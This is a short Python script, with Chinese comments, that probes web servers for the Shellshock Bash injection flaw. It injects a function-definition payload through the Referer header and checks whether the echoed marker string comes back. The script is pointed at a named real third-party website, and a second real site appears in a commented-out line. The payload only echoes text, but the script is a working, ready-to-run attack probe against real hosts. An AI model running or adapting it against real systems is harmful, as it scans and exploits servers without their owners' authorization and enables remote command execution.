# Bash注入漏洞
import requests
from termcolor import cprint

class Exploit:
    def attack(self, url):
        ref = r'() { Referer; }; echo -e "Content-Type: text/plain\n"; echo -e "test bash by hwc"'
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            'Referer': ref
        }
        try:
            req = requests.get(url=url, headers=headers)
            if r"test bash by hwc" in req.text:
                return "[+]存在Bash注入漏洞...(高危)"

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")
print(Exploit().attack(r'http://www.capaconcepts.com.hk'))
#print(Exploit().attack(r'http://shenzhen.baixing.com'))